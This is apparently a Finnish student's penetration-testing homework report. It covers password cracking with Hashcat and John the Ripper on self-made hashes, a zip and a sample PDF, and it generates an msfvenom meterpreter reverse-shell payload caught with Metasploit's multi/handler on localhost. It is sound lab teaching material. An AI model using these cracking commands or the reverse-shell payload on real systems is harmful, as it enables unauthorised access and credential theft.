# H4 Leviämässä

## x) Lue & Tiivistä
- Cracking Passwords with Hashcat
   - Järjestelmät eivät tallenna (ainakaan pitäisi) alkuperäisiä salasanoja vaan hasheja.
   - Hashaus on yksisuuntainen funktio.
   - Voidaan kuitenkin kokeilla millä salasanalla muodostuu sama hash. 
   - Hashcat tarvitsee hash-tyypin toimiakseen. 
- Crack File Password With John
   - John the ripper pystyy sanakirja-hyökkäyksellä murtamaan encryptoidun salasanan. 
   - Sanakirja hyökkäys ei toimi vahvoihin salasanoihin.
   - Suojattuja zip tiedostoja vastaan voidaan hyökätä hyökkäämällä sen hashiin. 
- Security Penetration Testing The Art of Hacking Series LiveLessons: Lesson 6
   - Salasanan suojaamien vaatii sen suojaamista sekä varastossa että kun sitä ollaan lähettämässä verkon yli.
   - Monet käyttävät oletussalasanoja tai samaa salasanaa kaikkiin laitteisiin.
   - Hyökkäysten ensimmäinen tavoite on tunnistaa validit käyttäjät, jonka jälkeen voidaan hyökätä salasanan kimppuun.
   - Hashaus ei ole encryptaamista, mutta sitä voidaan käyttää salasanojen suojaamiseen.
   - Hashaamiseen tulisi käyttää aina suolaa (salt).
   - Nykyään salasanoja on helpompi murtaa. 
- File-Format Exploits
   - File-format exploit ovat haavoittuvuuksia, jotka sijaitsevat lukijoissa (esim. Adobe PDF reader).
   - Nämä luottavat siihen, että käyttäjä avaa saastuneen tiedoston haavoittuvalla lukijalla.
   - Saastunutta tiedostoa voidaan esimerkiksi jakaa vastaanottajan sähköpostiin. 
- Understanding Active Directory
   - Active Directory on palvelu/työkalu, joka helpottaa käyttäjien, ryhmien, laitteiden ja käytänteiden hallintaa. 
   - Active Directoryn ollessa päällä, käyttäjien täytyy liittyä kyseiseen Windows toimialueelleseen toimiakseen.
   - Active Directorya määrittäessä, pitää sille luoda ```forest```, joka määrittelee sen loogisen turvallisuusrajan. 


## a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana.

Aloitin asentamalla hashcatin

```bash
sudo apt-get install -y hashcat
```

Loin tämän jälkeen kansion hashcatille, jossa aion työskennellä. 

```bash
mkdir hashcat
```

```bash
cd hashcat
```

![a1](https://github.com/user-attachments/assets/309a56c0-0b58-4cea-aac6-64c808f2c9ef)

Latasin tämän jälkeen sanakirjan, jota aion käyttää salasanojen murtamiseen (tässä tapauksessa [SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz)). Sillä tiedosto oli .tar.gz muodossa, purin pakkauksen sekä poistin alkuperäisen tiedoston. 

```bash
wget https://github.com/danielmiessler/SecLists/raw/0b739a3b00ec90f14fb1bb9a06841feffa1561f1/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

```bash
tar xf rockyou.txt.tar.gz
```

```bash
rm rockyou.txt.tar.gz
```

<img src="https://github.com/user-attachments/assets/4f268376-e79f-4749-8861-091313df6045" width="500"> <br/>

Tämän jälkeen loin esimerkkihashin murtamista varten. Varmistin että käyttämäni sana varmasti löytyy sanakirjasta poimimalla satunnaisesta rivistä sanasanan. Jotta en näe käyttämääni sanaa, putkitin perään ```sha1sum``` -komennon. 

```bash
awk 'NR==1337 {printf "%s", $0}' rockyou.txt | sha1sum
```

```bash
82eeba1f2783a67ccb954e1fe51e2ee863084784
```

Lisäsin tehtävän loppuun lyhyen selityksen awk:sta ja tarkemman selityksen käytetystä komennosta, jos awk ei ole aiemmin tuttu. 

Seuraavaksi tunnistetaan mitä moodia pitää käyttää hashin purkamiseksi

```bash
hashid -m '82eeba1f2783a67ccb954e1fe51e2ee863084784'
```

<img src="https://github.com/user-attachments/assets/d958e05b-2b5f-46fe-9637-77a987ff668a" width="500"> <br/>

```SHA-1 [Hashcat Mode: 100]``` on siis tulos, joka täytyy ottaa huomioon. Hyvä huomata, että hashcat ehdottaa useampaa moodia. Muista vaihtoehdoista ei tässä tapauksesta tarvitse tässä välittää, sillä tiesimme käytetyn hash funktion jo ennakkoon. 

```bash
hashcat -m 100 '82eeba1f2783a67ccb954e1fe51e2ee863084784' rockyou.txt -o tulos
```

<img src="https://github.com/user-attachments/assets/26f477ac-dc84-459f-949a-009e88771e67" width="500"> <br/>

Lopuksi tarkastetaan minkä salasanan hashcat löysi

```bash
cat tulos 
```

<img src="https://github.com/user-attachments/assets/9a13fdb7-48cf-4e7e-88d9-58edc779687d" width="500"> <br/>

```bash
82eeba1f2783a67ccb954e1fe51e2ee863084784:ramirez
```

Salasana näyttäisi olevan ```ramirez```, joten tarkastetaan vielä lopuksi oliko se alunperin käytetty salasana tulostamalla rivin 1337 sana. 

```bash
awk 'NR==1337' rockyou.txt
```

![a6](https://github.com/user-attachments/assets/eba3f510-1225-4efa-8474-e408d720dd92)

hashcat näyttäisi selvittäneen oikean salasanan onnistuneesti. 


### awk

Awk on tekstin prosessointiin ja suodatukseen käytetty työkalu. Sen avulla tekstiä voidaan suodattaa/prosessoida tavalla, mihin grep ei tyypillisesti sovellu (esim. suodattamaan määrireltyä aikaväliä tai muuttamaan suodatettua tietoa)

Lyhyt selitys vielä, jos ```awk``` -komento ei ole tuttu:     
```awk``` = työkalun nimi    
```NR==1337``` = Number of Record eli rivi 1337    
```{printf "%s", $0}``` = Print string, tässä tapauksessa halutaan pelkästään sana. Ilman tätä mukaan saattaisi tulla rivin lopussa oleva rivinvaihto. Mikäli tarkoituksena on vain tulostaa valittu rivi, ei tätä tarvita mutta emme halua hashiin mukaan rivinvaihtoa.    
```rockyou.txt``` = kohdetiedosto, jolle suodatus tehdään    

Aiemmassa tehtävässä oleellista on, että rivinvaihdon sisällyttäminen johtaa eri hashiin. 

```bash
awk 'NR==1337' rockyou.txt | sha1sum
efba0ddb75787cf6bf8734ea741152879bc62dd0
```

```bash
awk 'NR==1337 {printf "%s", $0}' rockyou.txt | sha1sum
82eeba1f2783a67ccb954e1fe51e2ee863084784
```

```bash
echo -n "ramirez" | sha1sum
82eeba1f2783a67ccb954e1fe51e2ee863084784
```


## c) Asenna John the Ripper ja testaa sen toiminta murtamalla jonkin esimerkkitiedoston salasana.

Siirryin John the Ripperin asennukseen. Ohjeistan poiketen, asensin john the ripperin ```apt-get```:llä sillä se löytyi Kalin paketinhallinnasta. 

```bash
apt-cache search 'john the ripper'
```

<img src="https://github.com/user-attachments/assets/45dd3ab7-cffa-4c62-ba40-ab0a323c61a3" width="500"> <br/>

```bash
sudo apt-get install 'john'
```

<img src="https://github.com/user-attachments/assets/0f6867ef-4a9a-4cc0-95cd-78a3becd95e8" width="500"> <br/>

Se olikin jo valmiiksi asennettuna Kaliin. Loin ensin kansion John the Ripperille sekä esimerkkitiedoston. 

```bash
mkdir jtr
```

```bash
cd jtr
```

```bash
echo "crackishellofadrug" > secret
```

Tämän jälkeen pakkasin tiedoston salasanalla. Käytän tässä hyödykseni aiemmin lataamaani rockyou.txt:ä. Ensin kopioin sen kuitenkin hashcat kansiosta nykyisesen kansiooni. 

```bash
cp /home/tunkt/hashcat/rockyou.txt /home/tunkt/jtr/rockyou.txt
```

```bash
zip -P "$(awk 'NR==5555 {printf "%s", $0}' rockyou.txt)" secret.zip secret
```

Lopuksi tarkastan vielä, etten pysty sitä purkamaan. 

```bash
unzip secret.zip
```

<img src="https://github.com/user-attachments/assets/71b5a965-47a7-4adb-a1c0-bf8920829278" width="500"> <br/>

Purkaminen vaatii siis salasanan, jota minulla ei vielä ole. 

Luodaan .zip tiedostosta hash, jota voidaan yrittää John the Ripperin avulla murtaa. 

```bash
zip2john secret.zip > secret.zip.hash
```

```bash
cat secret.zip.hash
```

<img src="https://github.com/user-attachments/assets/a785907b-bb22-4741-93ad-31d8fb902346" width="500"> <br/>

Nyt kun tiedostosta onnistuneesti luotu hash, joidaan aloittaa sen murtaminen John the Ripperillä. 


```bash
john secret.zip.hash
```

<img src="https://github.com/user-attachments/assets/884e38fb-9a10-4f1a-a97c-48725204f00e" width="500"> <br/>

Salasana näyttäisi olevan John the Ripperin mukaan ```katelynn```, joten tarkastetaan vielä lopuksi oliko sanasana oikein. 

```bash
awk 'NR==5555' rockyou.txt
```

![c6](https://github.com/user-attachments/assets/d7817d31-effa-48ce-9bf4-3ee772c3695b)

John the Ripper näyttäisi antaneen oikean salasanan ```katelynn```. 


## e) Tiedosto. Tee itse tai etsi verkosta jokin salakirjoitettu tiedosto, jonka saat auki. Murra sen salaus. (Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi).

Löysin esimerkkitiedoston Openwallin GitHubista ([john-samples/PDF/pdf_samples
/PDF-Example-Password.pdf](https://raw.githubusercontent.com/openwall/john-samples/main/PDF/pdf_samples/PDF-Example-Password.pdf)

```bash
wget https://raw.githubusercontent.com/openwall/john-samples/main/PDF/pdf_samples/PDF-Example-Password.pdf
```

Salasanasuojatun PDF-tiedoston ladattuani, pitää siitä saada hash jota aiotaan murtaa. Tämä onnistuu pdf2john:nin avulla. 

```bash
pdf2john PDF-Example-Password.pdf > pdf.hash
```

```bash
cat pdf.hash
```

<img src="https://github.com/user-attachments/assets/f7ecbdaa-ed44-4197-87f0-32a2aa4e0a1e" width="500"> <br/>

Tämän jälkeen voi aloittaa John the Ripperillä murtamisen jälleen

```bash
john pdf.hash
```

<img src="https://github.com/user-attachments/assets/197f85f2-b908-415e-a87e-0ba57703b250" width="500"> <br/>

Salasana olisi John the Ripperin mukaan ```test```. avasin vielä PDF:n ja kokeilin salasanaa todentaakseni sen oikeellisuuden. 

<img src="https://github.com/user-attachments/assets/38c588ab-5389-4ad9-8166-af474f588c60" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/024350db-a5f1-49e8-ada1-6c72591aa468" width="500"> <br/>

Tiedosto aukesi salasanalla ```test```, joten voidaan todeta löydetyn salasanan olleen oikea. 

## f) Tiiviste. Tee itse tai etsi verkosta salasanan tiiviste, jonka saat auki. Murra sen salaus. (Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi. Voit esim. tehdä käyttäjän Linuxiin ja murtaa sen salasanan.)

Otin esimerkkihashin ```e4fa1555ad877bf0ec455483371867200eee89550a93eff2f95a6198``` [hashcatin dokumentaatiosta](https://hashcat.net/wiki/doku.php?id=example_hashes) 

Aloitetaan tunnistamalla hash. 

```bash
hashid -m 'e4fa1555ad877bf0ec455483371867200eee89550a93eff2f95a6198'
```

<img src="https://github.com/user-attachments/assets/06d33b93-a836-4567-9528-b884c656b392" width="500"> <br/>

Sillä hashid ei kertonut mitä moodia kannattaa käyttää, hain listauksen moodeista ```hashcat --help```:llä ja suodatin listauksesta ylimääräiset ```grep```:llä. 

```bash
hashcat --help | grep '224'
```

<img src="https://github.com/user-attachments/assets/33eef6a4-d847-489c-9c64-91453f6ca277" width="500"> <br/>

SHA-224:lle löytyi kaksi hyvää vaihtoehtoa ```1300 | SHA2-224``` ja ```17300 | SHA3-224```. Lähdetään kokeilemaan onnistuuko kummallakaan näistä moodeista murtaminen. 

```bash
hashcat -m 1300 'e4fa1555ad877bf0ec455483371867200eee89550a93eff2f95a6198' rockyou.txt -o tulos2 
```

Kun hashcat oli ajanut loppuun, katsoin vielä selvitetyn salasanan

```bash
cat tulos2
```

<img src="https://github.com/user-attachments/assets/6226e06c-64d6-4491-9b5b-f9e938b4f666" width="500"> <br/>

Salasana oli siis ```hashcat```. 

Tarkastetaan vielä luomalla salasanasta hash aiemmin todetulla hash-funktiolla. 

```bash
echo -n "hashcat" | sha224sum
e4fa1555ad877bf0ec455483371867200eee89550a93eff2f95a6198
```

Hashit näyttäisivät täsmäävän. 

## g) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.
Haittaohjelma ei saa olla automaattisesti leviävä. Msfvenom tekee tyypillisillä asetuksilla ohjelman, joka avaa reverse shellin, kun sen ajaa, mutta joka ei leviä eikä tee muutenkaan mitään itsestään.
Raporttiin riittävät pelkät komennot ja raportti haitakkeen tekemisestä, itse binääriä ei ole pakko laittaa verkkoon. Mikäli laitat binäärin verkkoon, pakkaa se salakirjoitettuun zip-pakettiin ja laita salasanaksi "infected". Latauslinkin yhteydessä on oltava selkeä varoitus siitä, että kyseessä on haittaohjelma (malware), jota ei tule ajaa tuotantokoneilla. Salasanan voit halutessasi kertoa varoitusten yhteydessä.
Palvelimen päässä pitää olla reikä tulimuurissa. Reverse shell tarkoittaa, että palvelin on hyökkäyskoneella.

Aloitin jälleen luomalla ensin kansion, jossa aion työskennellä. 

```bash
mkdir mfs
```

```bash
cd mfs
```

![g1](https://github.com/user-attachments/assets/0f18dfec-994e-4201-add8-0d2708f8f839)

Tämän jälkeen ajoin komennon, jolla voi luoda haittaohjelman [dokumentaation](https://www.offsec.com/metasploit-unleashed/msfvenom/) avulla. 

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8 -f elf -o malware.elf
```

```msfvenom``` = Ajettava ohjelma    
```-p linux/x64/meterpreter/reverse_tcp``` = Payloadin tyyppi, tässä tapauksessa reverse tcp Linuxille.     
```LHOST=127.0.0.1``` = IP, johon saastunut kone yhdistää    
```LPORT=8``` = Portti, johon saastunut kone käyttää     
```-f elf``` = Luodun haittaohjelman tiedostoformaatti    
```-o malware.elf``` = Luodun haittaohjelman nimi    

<img src="https://github.com/user-attachments/assets/86710d46-8716-469f-bc3d-65741bf82ecd" width="500"> <br/>


Tehtävänannossa ei pyydetty ajamaan haittaohjelmaa, mutta halusin nähdä miten se toimii käytännössä. 

Tämän jälkeen avasin toisesssa terminaalissa mfsconsolen, jotta voin asettaa sen kuuntelemaan. 

```bash
msfconsole
```

<img src="https://github.com/user-attachments/assets/39002926-1add-4eba-8e50-1baf8cc888ef" width="500"> <br/>

Tämän jälkeen määrittelin mfsconsoleen mitä kuunnellaan alkuperäisen payloadin perusteella. 

```bash
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 8
exploit
```

Tämän jälkeen palasin ensimmäiseen terminaaliin ajamaan luomani haittaohjelman, joka ennen sille pitää asettaa ensin execute oikeudet. 

```bash
chmod -x malware.elf
```

Tämä ei suostunut antamaan execute oikeuksia tiedostolle, joten kokeilin uudelleennimeämistä. 

```bash
mv malware.elf tainted.elf 
```

```bash
./tainted.elf
```

Nyt näyttäisi suostuneen muuttaa oikeudet ja ajaa haittaohjelman. Palataan katsomaan mitä msfconsole näyttää. 

<img src="https://github.com/user-attachments/assets/5c813163-4735-433e-969f-e61476799533" width="500"> <br/>

Yhteys koneeseen näyttäisi muodostuneen, joten sen jälkeen voitaisiin lähteä kohdekonetta käyttämään hyväksi. Kokeilin muutamaa komentoa testiksi. 

```bash
sysinfo
```

![g5](https://github.com/user-attachments/assets/b5b680d4-9fac-42a9-afd7-f15910254484)

```bash
ls
```

<img src="https://github.com/user-attachments/assets/9a3adfcb-7aa8-4d9e-be84-bdd5c8673723" width="500"> <br/>

Tämän avulla voitaisiin siis navigoida koneella, siepata koneelta haluttavat tiedot tai käskeä kohdekonetta tekemään haluttavat toimenpiteet. 


## Ajankäyttö: 

- Materiaalien lukemiseen ja tiivistämiseen n. 2h
- Tehtäviin ja materiaalien lukemiseen n. 3h. 
- Raportointiin ja dokumentointiin n. 2h. 

## Lähteet: 

Karvinen, T. 2025. Tunkeutumistestaus.    
https://terokarvinen.com/tunkeutumistestaus/    
Tehtävänanto.    

Karvinen, T. 2022. Cracking Passwords with Hashcat.     
https://terokarvinen.com/2022/cracking-passwords-with-hashcat/    
Tehtävä x.    

Karvinen, T. 2023. Crack File Password With John.     
https://terokarvinen.com/2023/crack-file-password-with-john/   
Tehtävä x.    

Santos, O et al. 2017. The Art of Hacking Series LiveLessons. Lesson 6: Hacking User Credentials.     
https://www.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00/    
Tehtävä x.    

Kennedy, D et al. 2025. Metasploit, 2nd Edition. Chapter 9: Client-side attacks.    
https://www.oreilly.com/library/view/metasploit-2nd-edition/9798341620032/xhtml/chapter9.xhtml#:-:text=File-Format%20Exploits    
Tehtävä x.    

Singh, G. 2024. The Ultimate Kali Linux Book - Third Edition. Chapter 12: Understanding Active Directory.     
https://www.oreilly.com/library/view/the-ultimate-kali/9781835085806/Text/Chapter_12.xhtml#_idParaDest-272    
Tehtävä x.    

GitHub. s.a. SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz    
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz    
Tehtävät a, c.    

GitHub. s.a. openwall/john-samples/blob/main/PDF/pdf_samples/PDF-Example-Password.pdf    
https://github.com/openwall/john-samples/blob/main/PDF/pdf_samples/PDF-Example-Password.pdf    
Tehtävä e.    

Offsec. s.a. MSFvenom.    
https://www.offsec.com/metasploit-unleashed/msfvenom/    
Tehtävä g.    
